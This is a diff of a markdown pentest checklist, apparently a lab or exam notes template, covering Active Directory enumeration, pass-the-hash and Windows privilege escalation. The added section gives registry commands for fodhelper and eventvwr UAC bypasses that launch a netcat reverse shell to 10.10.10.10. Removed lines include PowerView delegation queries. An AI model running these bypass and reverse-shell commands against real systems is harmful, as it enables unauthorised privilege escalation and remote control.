@@ -1223,13 +1223,29 @@ postgres:postgres
 
 ```
 
-## BloodHound
+# Active Directory?
 
-bloodhound-python
+## SPNs?
 
 ```
-bloodhound-python -c ALL -u ldap -p 'passwd' -d domain.com -ns dc-ip
+impacket-GetUserSPNs
 
+# Result:
+
+```
+
+Crack the hash?
+
+```
+# Result:
+
+```
+
+## Pass the Hash
+
+Found user's NTLM hash? Can you pass it?
+
+```
 # Result:
 
 ```
@@ -1286,6 +1302,40 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 ```
 
 
+## UAC Bypass
+
+```
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v [EnableLUA]
+
+# Result:
+
+```
+
+fodhelper? eventvwr?
+
+```
+# fodhelper.exe
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "c:\windows\tasks\nc.exe 10.10.10.10 443 -e cmd.exe"  /f
+  
+# eventvwr.exe
+REG ADD HKCU\Software\Classes\mscfile\shell\open\command
+REG ADD HKCU\Software\Classes\mscfile\shell\open\command /v DelegateExecute /t REG_SZ
+REG ADD HKCU\Software\Classes\mscfile\shell\open\command /d "C:\windows\tasks\nc.exe 10.10.10.10 443 -e cmd.exe" /f
+```
+
+For more, check the following repo.
+
+[https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)
+
+
+```
+# Result:
+
+```
+
+
 ## Web server log files? Traffic come from?
 
 ```
@@ -1321,14 +1371,6 @@ netstat -ano
 ```
 
 
-## UAC Status
-
-```
-REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v [EnableLUA]
-
-# Result:
-
-```
 
 
 ## Windows build? Any Public Vulnerability?
@@ -1359,88 +1401,6 @@ Get-ScheduledTask -TaskName "Word" -Verbose | Select *
 # Result:
 
 ```
-
-UAC bypass? Check the following repo.
-
-[https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)
-
-
-```
-# Result:
-
-```
-
-
-## Active Directory?
-
-### PowerView
-
-Get all domain admins
-
-```
-Get-DomainGroupMember -Identity "Domain Admins" -Recurse
-
-# Result:
-
-```
-
-Get all user SPNs
-
-```
-Get-DomainUser -SPN
-
-# Result:
-
-```
-
-## Delegation?
-
-### Unconstrained
-
-```
-Get-DomainComputer -Unconstrained
-
-# Result:
-```
-
-### Constrained
-
-```
-Get-DomainUser -TrustedToAuth
-
-# Result:
-
-```
-
-### Resource-Based Constrained Delegation (RBCD)
-
-```
-# Get GenericWrite targets
-Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
-
-# Result:
-
-```
-
-### LAPS intalled?
-
-```
-# Result:
-
-```
-
-
-## Bloodhound
-
-Check bloodhound for PE vectors
-
-```
-# Result:
-
-```
-
-
-
 
 
 ## Patch? SMBGhost?
